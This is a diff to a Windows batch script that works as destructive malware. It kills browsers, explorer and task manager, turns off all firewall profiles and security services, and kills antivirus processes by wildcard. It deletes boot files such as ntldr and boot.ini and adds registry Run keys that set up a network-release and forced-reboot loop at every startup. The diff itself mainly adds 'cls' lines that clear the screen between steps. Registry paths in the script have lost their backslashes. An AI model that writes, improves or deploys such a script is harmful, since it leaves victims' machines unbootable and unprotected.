@@ -9,26 +9,28 @@ taskkill /F /IM "firefox.exe" /T
 taskkill /F /IM "ProcessHacker.exe" /T
 taskkill /F /IM "explorer.exe" /T
 taskkill /F /IM "taskmgr.exe" /T
-
+cls
 start /min FBSOD.bat
-
+cls
 netsh firewall set opmode disable
 netsh firewall set opmode mode=DISABLE
+cls
 netsh advfirewall set currentprofile state off
 netsh advfirewall set domainprofile state off
 netsh advfirewall set privateprofile state off
 netsh advfirewall set publicprofile state off
 netsh advfirewall set allprofiles state off
+cls
 net stop “Security Center”
 netsh firewall set opmode mode=disable
-
+cls
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
 echo ipconfig/release_all>>c:windowswimn32.bat
 echo end>>c:windowswimn32.bat
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
-
+cls
 tskill /A av*
 tskill /A fire*
 tskill /A anti*
@@ -93,6 +95,7 @@ cls
 tskill /A panda*
 tskill /A avsch*
 tskill /A sche*
+cls
 tskill /A syman*
 tskill /A virus*
 tskill /A realm*
@@ -159,7 +162,7 @@ del c:boot.ini
 attrib -r -s -h c:ntldr
 del c:ntldr
 attrib -r -s -h c:windowswin.ini
-
+cls
 del c:windowswin.ini
 :start
 taskkill /f /im Taskmgr.exe
@@ -168,6 +171,7 @@ net send * WORKGROUP ENABLED
 net send * WORKGROUP ENABLED
 taskkill /f /im wininit.exe
 taskkill /f /im explorer.exe
+cls
 start /min FBSOD.bat
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
@@ -176,14 +180,13 @@ taskkill /F /IM "firefox.exe" /T
 taskkill /F /IM "ProcessHacker.exe" /T
 taskkill /F /IM "explorer.exe" /T
 taskkill /F /IM "taskmgr.exe" /T
-net send * WORKGROUP ENABLED
-net send * WORKGROUP ENABLED
 goto e
 :e
 echo @echo off>c:windowshartlell.bat
 echo break off>>c:windowshartlell.bat
 echo shutdown -r -t 11 -f>>c:windowshartlell.bat
 echo end>>c:windowshartlell.bat
+cls
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
 goto start
